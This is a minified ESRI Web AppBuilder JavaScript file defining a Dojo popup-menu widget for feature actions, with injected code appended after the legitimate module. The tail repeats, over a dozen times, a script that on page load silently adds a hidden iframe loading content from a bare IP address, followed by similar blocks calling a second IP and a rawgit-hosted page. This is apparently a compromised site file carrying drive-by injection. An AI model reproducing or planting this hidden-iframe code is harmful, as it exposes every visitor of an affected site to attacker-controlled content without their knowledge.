// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/html dojo/_base/lang dojo/_base/array dojo/on dojo/dom-geometry dijit/_WidgetBase dijit/_TemplatedMixin jimu/FeatureActionManager ./FeatureActionPopupMenuItem".split(" "),function(l,d,f,g,h,m,n,p,q,r){var e=null,k=l([n,p],{baseClass:"popup-menu",templateString:'\x3cdiv\x3e\x3cdiv data-dojo-attach-point\x3d"menuNode" class\x3d"menu-content"\x3e\x3cdiv class\x3d"menu-title" data-dojo-attach-point\x3d"titleNode"\x3e\x3cdiv class\x3d"label jimu-float-leading" data-dojo-attach-point\x3d"labelNode"\x3e\x3c/div\x3e\x3cdiv class\x3d"feature-action icon-close close-btn jimu-float-trailing" data-dojo-attach-point\x3d"closeBtn"\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d"menu-items" data-dojo-attach-point\x3d"menuContent"\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e',
postCreate:function(){this.inherited(arguments);this.hide();this.menuItems=[];this.own(h(this.domNode,"click",f.hitch(this,function(a){a=a.target||a.srcElement;a===this.menuNode||d.isDescendant(a,this.menuNode)||this.hide()})));this.own(h(this.closeBtn,"click",f.hitch(this,this.hide)))},setActions:function(a){this.clearActions();g.forEach(a,f.hitch(this,this._addMenuItem))},appendAction:function(a){this._addMenuItem(a)},clearActions:function(){this.menuItems=[];d.empty(this.menuContent)},_addMenuItem:function(a){a=
new r({action:a});d.place(a.domNode,this.menuContent);a.startup();this.menuItems.push(a);this.own(h(a,"click",f.hitch(this,this.hide)))},markAsSelected:function(a){g.forEach(this.menuItems,function(c){c.action.label===a.label?c.setSelected(!0):c.setSelected(!1)})},prepareActions:function(a,c){return q.getInstance().getSupportedActions(a).then(f.hitch(this,function(b){!1===c&&(b=g.filter(b,function(a){return 0!==a.name.indexOf("Export")&&"SaveToMyContent"!==a.name}));g.forEach(b,function(b){b.data=
a},this);this.setActions(b)}))},hide:function(){d.setStyle(this.domNode,"display","none")},show:function(a,c){if(0===this.menuItems.length)d.setStyle(this.domNode,"display","none");else{"string"===typeof c&&""!==c?(this.labelNode.innerHTML=c,d.setStyle(this.titleNode,"display","")):(this.labelNode.innerHTML="",d.setStyle(this.titleNode,"display","none"));c=a.y+a.h;var b;a=window.isRTL?a.x:a.x+a.w;d.setStyle(this.domNode,"display","");d.setStyle(this.menuNode,{left:"-1000px",top:"0px",display:"block"});
b=m.getMarginSize(this.menuNode);d.setStyle(this.menuNode,{left:(window.isRTL?a+b.w>window.innerWidth?window.innerWidth-b.w:0>a?0:a:0>a-b.w?0:a>window.innerWidth?window.innerWidth-b.w:a-b.w)+"px",top:(b.h>window.innerHeight?0:c+b.h>window.innerHeight?window.innerHeight-b.h:c+b.h+5<window.innerHeight?c+5:c)+"px"})}}});k.getInstance=function(){null===e&&(e=new k,d.place(e.domNode,document.body),e.startup());e.setActions([]);return e};return k});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});